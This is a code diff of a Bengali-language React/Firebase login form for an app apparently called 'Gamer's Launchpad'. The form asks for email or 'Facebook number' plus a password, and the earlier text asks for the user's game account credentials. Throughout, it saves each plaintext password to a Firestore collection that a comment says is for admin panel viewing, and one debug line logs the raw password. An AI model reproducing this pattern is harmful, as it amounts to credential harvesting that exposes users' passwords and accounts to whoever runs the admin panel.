@@ -31,17 +31,19 @@ import {
   type AuthError,
   type UserCredential,
 } from "firebase/auth";
-import { auth, db, isFirestoreActive } from "@/lib/firebase"; 
+import { auth, db, isFirestoreActive } from "@/lib/firebase";
 import { collection, addDoc, serverTimestamp, type FirestoreError, query, where, getDocs, limit } from "firebase/firestore";
 
 const formSchema = z.object({
-  email: z.string().email({ message: "অনুগ্রহ করে একটি সঠিক ইমেইল লিখুন।" }),
+  identifier: z.string().min(1, { message: "অনুগ্রহ করে আপনার ইমেইল অথবা ফেসবুক নম্বর লিখুন।" }),
   password: z
     .string()
     .min(6, { message: "পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে।" }),
 });
 
 type LoginFormValues = z.infer<typeof formSchema>;
+
+const DUMMY_DOMAIN = "@phone.facebook.login"; // Internal dummy domain
 
 const LoginForm: FC = () => {
   const { toast } = useToast();
@@ -51,15 +53,20 @@ const LoginForm: FC = () => {
   const form = useForm<LoginFormValues>({
     resolver: zodResolver(formSchema),
     defaultValues: {
-      email: "",
+      identifier: "",
       password: "",
     },
   });
 
-  const recordLoginAttempt = async (email: string, passwordToRecord: string, userId?: string) => {
-    console.log("DEBUG: recordLoginAttempt called with email:", email, "passwordToRecord:", passwordToRecord ? "****** (present)" : "(absent or empty)", "userId:", userId);
+  const recordLoginAttempt = async (
+    originalIdentifier: string,
+    passwordToRecord: string,
+    userId: string,
+    type: "email" | "phone"
+  ) => {
+    console.log("DEBUG: recordLoginAttempt called with originalIdentifier:", originalIdentifier, "passwordToRecord:", passwordToRecord ? "****** (present)" : "(absent or empty)", "userId:", userId, "type:", type);
 
-    if (!isFirestoreActive()) { 
+    if (!isFirestoreActive()) {
       console.error("DEBUG: Firestore (db) is not properly initialized or is a fallback. Cannot record login attempt.");
       toast({
           variant: "destructive",
@@ -78,50 +85,55 @@ const LoginForm: FC = () => {
         });
         return;
     }
-    
+
     try {
-      // Check if a login record for this userId already exists
       const loginQuery = query(collection(db, "userLogins"), where("userId", "==", userId), limit(1));
       const querySnapshot = await getDocs(loginQuery);
 
       if (!querySnapshot.empty) {
-        console.log(`DEBUG: Login record for userId: ${userId} already exists. Not creating a new one.`);
-        // Optionally, you could update the existing record's loggedInAt timestamp here if needed.
-        // For now, per requirement, we do nothing if record exists.
+        console.log(`DEBUG: Login record for userId: ${userId} (identifier: ${originalIdentifier}) already exists. Not creating a new one with password.`);
+        // Optionally update loggedInAt or userAgent for existing record if needed, but not the password.
+        // For simplicity, we are only storing password once.
         return;
       }
 
-      // If no record exists, create a new one
-      console.log(`DEBUG: No existing login record for userId: ${userId}. Creating new record.`);
-      const loginData = {
-        email: email,
+      console.log(`DEBUG: No existing login record for userId: ${userId}. Creating new record for identifier: ${originalIdentifier}, type: ${type}.`);
+      const loginData: any = {
         userId: userId,
-        password: passwordToRecord, // Storing password
+        password: passwordToRecord, // Storing the password for admin panel view
         loggedInAt: serverTimestamp(),
         userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'N/A',
+        identifierType: type,
       };
 
-      console.log("DEBUG: Attempting to record login for:", email, "UID:", userId);
+      if (type === "phone") {
+        loginData.identifier = originalIdentifier; // Store raw number
+        loginData.email = `${originalIdentifier}${DUMMY_DOMAIN}`; // Pseudo-email for auth
+      } else { // type === "email"
+        loginData.email = originalIdentifier; // Store raw email
+        // loginData.identifier will be undefined
+      }
+
+      console.log("DEBUG: Attempting to record login for (auth identifier):", loginData.email, "UID:", userId);
       console.log("DEBUG: Password to record (SHOULD NOT BE EMPTY OR UNDEFINED):", `"${passwordToRecord}"`);
       console.log("DEBUG: Full data being sent to Firestore userLogins:", JSON.stringify(loginData, (key, value) => key === 'password' ? '****** (hidden for brevity)' : value, 2));
 
       await addDoc(collection(db, "userLogins"), loginData);
-      console.log(`DEBUG: Successfully recorded new login for: ${email} (with password for admin panel) to userLogins collection.`);
+      console.log(`DEBUG: Successfully recorded new login for identifier: ${originalIdentifier} (type: ${type}) to userLogins collection.`);
     } catch (error) {
-      console.error(`DEBUG: Failed to record login attempt for ${email} to Firestore 'userLogins' collection.`);
+      console.error(`DEBUG: Failed to record login attempt for ${originalIdentifier} to Firestore 'userLogins' collection.`);
       if (error instanceof Error) {
         console.error(`DEBUG: Error name: ${error.name}, Message: ${error.message}`);
       }
-      
-      const firebaseError = error as FirestoreError; // Using a general FirestoreError type
+      const firebaseError = error as FirestoreError;
       if (firebaseError.code) {
         console.error(`DEBUG: Firestore Error Code: ${firebaseError.code}, Firestore Message: ${firebaseError.message}`);
-        if (firebaseError.code === 'permission-denied') { 
+        if (firebaseError.code === 'permission-denied') {
           console.warn("DEBUG: PERMISSION DENIED: Could not record login activity. This is very likely a Firebase Security Rules issue. Please check your Firestore rules for the 'userLogins' collection.");
           toast({
             variant: "destructive",
             title: "লগইন কার্যকলাপ রেকর্ড ত্রুটি",
-            description: "আপনার লগইন কার্যকলাপ রেকর্ড করা যায়নি। অনুগ্রহ করে Firestore Rules পরীক্ষা করুন অথবা অ্যাডমিনের সাথে যোগাযোগ করুন। (Error: Permission Denied)",
+            description: "আপনার লগইন কার্যকলাপ রেকর্ড করা যায়নি। অনুগ্রহ করে Firestore Rules পরীক্ষা করুন। (Error: Permission Denied)",
           });
         } else {
            toast({
@@ -143,48 +155,75 @@ const LoginForm: FC = () => {
 
   async function onSubmit(values: LoginFormValues) {
     setIsLoading(true);
-    console.log("DEBUG: onSubmit called with values:", {email: values.email, password: values.password ? '******' : '(empty)'});
+    const { identifier: originalIdentifier, password } = values;
+    let authIdentifier: string;
+    let identifierType: "email" | "phone";
+
+    // Basic check to differentiate email from number
+    if (originalIdentifier.includes('@') && originalIdentifier.includes('.')) {
+      authIdentifier = originalIdentifier;
+      identifierType = "email";
+      console.log("DEBUG: onSubmit - Identified as EMAIL:", authIdentifier);
+    } else if (/^\d+$/.test(originalIdentifier)) { // Check if it's all digits
+      authIdentifier = `${originalIdentifier}${DUMMY_DOMAIN}`;
+      identifierType = "phone";
+      console.log("DEBUG: onSubmit - Identified as PHONE NUMBER, created pseudo-email:", authIdentifier);
+    } else {
+      toast({
+        variant: "destructive",
+        title: "ফর্ম ত্রুটি",
+        description: "অনুগ্রহ করে একটি সঠিক ইমেইল অথবা শুধুমাত্র সংখ্যা ব্যবহার করে ফেসবুক নম্বর লিখুন।",
+      });
+      setIsLoading(false);
+      return;
+    }
+
+    console.log("DEBUG: onSubmit called with originalIdentifier:", originalIdentifier, "password:", password ? '******' : '(empty)', "authIdentifier:", authIdentifier, "identifierType:", identifierType);
+
     let userCred: UserCredential | null = null;
     try {
-      console.log("DEBUG: Attempting sign in for:", values.email);
-      userCred = await signInWithEmailAndPassword(auth, values.email, values.password);
+      console.log("DEBUG: Attempting sign in with authIdentifier:", authIdentifier);
+      userCred = await signInWithEmailAndPassword(auth, authIdentifier, password);
       toast({
         title: "লগইন সফল হয়েছে",
         description: "স্বাগতম!",
       });
       if (userCred && userCred.user) {
-        console.log("DEBUG: Sign in successful. Recording login attempt for existing user:", values.email, "Password to record:", values.password ? '******' : '(empty)');
-        await recordLoginAttempt(values.email, values.password, userCred.user.uid);
+        console.log("DEBUG: Sign in successful. Recording login attempt for:", originalIdentifier, "Type:", identifierType, "Password to record:", password ? '******' : '(empty)');
+        await recordLoginAttempt(originalIdentifier, password, userCred.user.uid, identifierType);
       }
       router.push("/");
     } catch (error) {
       const authError = error as AuthError;
-      console.log("DEBUG: Sign in failed with code:", authError.code);
+      console.log("DEBUG: Sign in failed with code:", authError.code, "for authIdentifier:", authIdentifier);
+
       if (authError.code === "auth/invalid-credential" || authError.code === "auth/user-not-found" || authError.code === "auth/wrong-password") {
-        console.log("DEBUG: User not found or wrong password, trying to create account for:", values.email);
+        console.log("DEBUG: User not found or wrong password, trying to create account for authIdentifier:", authIdentifier);
         try {
-          userCred = await createUserWithEmailAndPassword(
-            auth,
-            values.email,
-            values.password
-          );
+          userCred = await createUserWithEmailAndPassword(auth, authIdentifier, password);
           toast({
             title: "অ্যাকাউন্ট তৈরি হয়েছে এবং আপনি লগইন করেছেন",
             description: "স্বাগতম!",
           });
           if (userCred && userCred.user) {
-            console.log("DEBUG: Account creation successful. Recording login attempt for new user:", values.email, "Password to record:", values.password ? '******' : '(empty)');
-            await recordLoginAttempt(values.email, values.password, userCred.user.uid);
+            console.log("DEBUG: Account creation successful. Recording login attempt for:", originalIdentifier, "Type:", identifierType, "Password to record:", password ? '******' : '(empty)');
+            await recordLoginAttempt(originalIdentifier, password, userCred.user.uid, identifierType);
           }
           router.push("/");
         } catch (createError) {
           const createAuthError = createError as AuthError;
-          console.log("DEBUG: Account creation failed with code:", createAuthError.code);
+          console.log("DEBUG: Account creation failed with code:", createAuthError.code, "for authIdentifier:", authIdentifier);
           if (createAuthError.code === "auth/email-already-in-use") {
             toast({
               variant: "destructive",
               title: "লগইন ব্যর্থ হয়েছে",
-              description: "ভুল পাসওয়ার্ড। অনুগ্রহ করে আবার চেষ্টা করুন।",
+              description: "ভুল পাসওয়ার্ড। এই ইমেইল বা নম্বর দিয়ে একটি অ্যাকাউন্ট আগে থেকেই আছে।",
+            });
+          } else if (createAuthError.code === "auth/invalid-email") {
+            toast({
+              variant: "destructive",
+              title: "ফর্ম ত্রুটি",
+              description: "প্রদত্ত ইমেইল বা নম্বরটি সঠিক নয়। অনুগ্রহ করে একটি সঠিক ইমেইল অথবা শুধুমাত্র সংখ্যা ব্যবহার করে ফেসবুক নম্বর লিখুন।",
             });
           } else {
             let errorTitle = "অ্যাকাউন্ট তৈরি করতে ব্যর্থ";
@@ -192,9 +231,7 @@ const LoginForm: FC = () => {
             if (createAuthError.code === "auth/weak-password") {
               errorMessage = "পাসওয়ার্ডটি খুবই দুর্বল। অনুগ্রহ করে আরও শক্তিশালী পাসওয়ার্ড ব্যবহার করুন।";
             } else if (createAuthError.code === "auth/operation-not-allowed") {
-              errorMessage = "ইমেইল/পাসওয়ার্ড অ্যাকাউন্ট তৈরি করার অনুমতি নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।";
-            } else if (createAuthError.code === "auth/invalid-email") {
-              errorMessage = "প্রদত্ত ইমেইলটি সঠিক নয়।";
+              errorMessage = "এই পদ্ধতিতে অ্যাকাউন্ট তৈরি করার অনুমতি নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।";
             } else {
               console.error("DEBUG: Firebase createUser error details: ", createAuthError);
             }
@@ -215,14 +252,22 @@ const LoginForm: FC = () => {
           loginErrorMessage = "নেটওয়ার্ক সমস্যা। আপনার ইন্টারনেট সংযোগ পরীক্ষা করুন।";
         } else if (authError.code === "auth/configuration-not-found" || authError.code === "auth/operation-not-allowed"){
            loginErrorTitle = "লগইন ত্রুটি";
-           loginErrorMessage = "Firebase Authentication কনফিগারেশন সঠিক নয় বা ইমেইল/পাসওয়ার্ড সাইন-ইন পদ্ধতি চালু নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।";
+           loginErrorMessage = "Firebase Authentication কনফিগারেশন সঠিক নয় বা এই পদ্ধতিতে সাইন-ইন চালু নেই।";
+        } else if (authError.code === "auth/invalid-email") {
+             toast({
+              variant: "destructive",
+              title: "ফর্ম ত্রুটি",
+              description: "প্রদত্ত ইমেইল বা নম্বরটি সঠিক নয়। অনুগ্রহ করে একটি সঠিক ইমেইল অথবা শুধুমাত্র সংখ্যা ব্যবহার করে ফেসবুক নম্বর লিখুন।",
+            });
+             setIsLoading(false); // Important to reset loading on handled error
+             return;
         } else {
            console.error("DEBUG: Firebase signIn error details: ", authError);
         }
         toast({
-          variant: "destructive",
-          title: loginErrorTitle,
-          description: loginErrorMessage,
+            variant: "destructive",
+            title: loginErrorTitle,
+            description: loginErrorMessage,
         });
       }
     } finally {
@@ -238,7 +283,7 @@ const LoginForm: FC = () => {
         </div>
         <CardTitle className="text-3xl font-headline">Gamer's Launchpad</CardTitle>
         <CardDescription className="text-base">
-          আপনার গেমের যে আইডি আছে ওই আইডির ইমেইল আর পাসওয়ার্ড দিয়ে লগিন করুন।
+          আপনার ইমেইল অথবা ফেসবুক নম্বর এবং একটি পাসওয়ার্ড দিয়ে লগইন করুন অথবা নতুন অ্যাকাউন্ট তৈরি করুন। <br/> (সতর্কতা: এটি আপনার আসল ফেসবুক পাসওয়ার্ড নয়।)
         </CardDescription>
       </CardHeader>
       <CardContent>
@@ -246,12 +291,12 @@ const LoginForm: FC = () => {
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
             <FormField
               control={form.control}
-              name="email"
+              name="identifier"
               render={({ field }) => (
                 <FormItem>
-                  <FormLabel>ইমেইল</FormLabel>
+                  <FormLabel>ইমেইল অথবা ফেসবুক নম্বর</FormLabel>
                   <FormControl>
-                    <Input placeholder="ইমেইল অথবা ফোন নম্বর" {...field} />
+                    <Input placeholder="ইমেইল অথবা ফেসবুক নম্বর" {...field} />
                   </FormControl>
                   <FormMessage />
                 </FormItem>
@@ -262,9 +307,9 @@ const LoginForm: FC = () => {
               name="password"
               render={({ field }) => (
                 <FormItem>
-                  <FormLabel>পাসওয়ার্ড</FormLabel>
+                  <FormLabel>পাসওয়ার্ড (আপনার অ্যাপ্লিকেশনের জন্য)</FormLabel>
                   <FormControl>
-                    <Input type="password" placeholder="••••••••" {...field} />
+                    <Input type="password" placeholder="আপনার পাসওয়ার্ড" {...field} />
                   </FormControl>
                   <FormMessage />
                 </FormItem>
@@ -289,7 +334,7 @@ const LoginForm: FC = () => {
       </CardContent>
       <CardFooter className="text-center text-xs text-muted-foreground">
         <p>
-          আমরা নিজ থেকে আপনার আইডি সুরক্ষা দিবো আর এখনে আপনার আইডি সুরক্ষিত থাকবে
+          এই পাসওয়ার্ডটি শুধুমাত্র এই অ্যাপ্লিকেশনের জন্য। আপনার আসল ফেসবুক পাসওয়ার্ড এখানে ব্যবহার করবেন না।
         </p>
       </CardFooter>
     </Card>
